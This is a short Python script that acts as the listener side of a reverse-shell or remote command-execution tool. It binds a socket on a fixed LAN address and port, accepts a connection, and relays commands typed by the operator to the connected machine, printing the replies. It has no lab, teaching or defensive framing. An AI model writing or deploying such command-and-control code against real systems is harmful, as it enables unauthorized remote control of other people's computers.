import socket
import sys

# creates socket
def create_socket():
    try:
        global HOST
        global PORT
        global s
        HOST = '192.168.1.107'
        PORT = 6699
        s = socket.socket()
    
    except socket.error as err:
        print('socket creation error')
        print(str(err))

# binds socket
def bind_socket():
    try:
        global HOST
        global PORT
        global s

        print('binding socket...')
        s.bind((HOST,PORT))
        s.listen(5) # reconnection tolerance
    
    except socket.error as err:
        print(str(err))
        bind_socket()

# establishes connection
def socket_accept():
    con, add = s.accept()
    print(f'connection is established with {add[0]}:{add[1]}')
    remoteEXE(con)
    con.close()

# called in >> socket_accept()
def remoteEXE(con):
    while True:
        cmd = input()

        if cmd == 'end':
            con.close()
            s.close()
            sys.exit()
            break

        if len(str.encode(cmd)) > 0:
            con.send(cmd.encode('utf-8'))
            con_resp = str(con.recv(1024), 'utf-8')
            print(con_resp, end="") # makes cli go to next line

# Runs main
def main():
    create_socket()
    bind_socket()
    socket_accept()

if __name__ == '__main__':
    main()